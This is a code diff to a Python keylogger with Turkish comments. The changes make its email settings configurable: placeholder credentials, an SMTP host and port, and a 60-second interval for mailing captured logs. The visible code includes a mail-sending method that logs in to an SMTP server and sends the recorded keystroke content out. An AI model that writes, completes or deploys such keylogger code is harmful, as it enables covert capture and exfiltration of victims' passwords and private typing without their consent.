@@ -4,10 +4,11 @@ from threading import Timer
 from datetime import datetime
 import sifre
 
-MAIL_USER = str(sifre.MAIL_USER) # " " arasina e-mail addressinizi
-MAIL_SIFRE = str(sifre.MAIL_SIFRE) # " " arasina sifrenizi yazin
-MAIL_SMTP = "smtp.ethereal.email"
-RAPOR_SURE = 60
+MAIL_USER = "MAIL ADDRESSINIZI GIRIN" 
+MAIL_SIFRE = "MAIL SIFRENIZI GIRIN" 
+MAIL_SMTP = "smtp.ethereal.email" #Ethereal Örnegidir
+SMTP_PORT = 587 # Ethereal Portudur
+RAPOR_SURE = 60 # loglarin mail ile atilma süresini düzenler
 
 
 class Keylogger:
@@ -62,7 +63,7 @@ class Keylogger:
         print(f"[+] Yeni girdi: {self.dosya_adi}.txt") # Terminalden cikti verir
 
     def mail_gonderme(self, icerik, mail=MAIL_USER, sifre=MAIL_SIFRE):
-        server = smtplib.SMTP(host=MAIL_SMTP, port=587)
+        server = smtplib.SMTP(host=MAIL_SMTP, port=SMTP_PORT)
         #TLS modunda sifreleme icin :
         server.starttls()
         server.login(mail, sifre)
